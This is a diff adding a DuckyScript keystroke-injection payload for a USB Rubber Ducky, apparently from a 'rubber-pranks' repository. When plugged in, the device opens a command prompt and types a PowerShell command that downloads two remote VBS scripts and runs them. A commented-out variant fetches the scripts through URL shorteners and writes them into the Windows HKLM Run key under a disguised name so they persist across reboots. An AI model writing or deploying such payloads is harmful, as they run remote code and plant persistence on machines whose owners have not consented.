@@ -1,0 +1,28 @@
+DELAY 2000
+
+REM DELAY 600
+REM ESCAPE
+
+DELAY 300
+CONTROL ESCAPE
+DELAY 300
+STRING cmd
+DELAY 700
+REM MENU
+REM DELAY 300
+REM DOWNARROW
+REM DELAY 300
+ENTER
+
+REM DELAY 500
+REM ALT y
+
+DELAY 600
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/volup.vbs','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/cena.vbs','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && exit
+
+REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\cena.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
+DELAY 200
+ENTER
+DELAY 200
+WINDOWS DOWNARROW
+
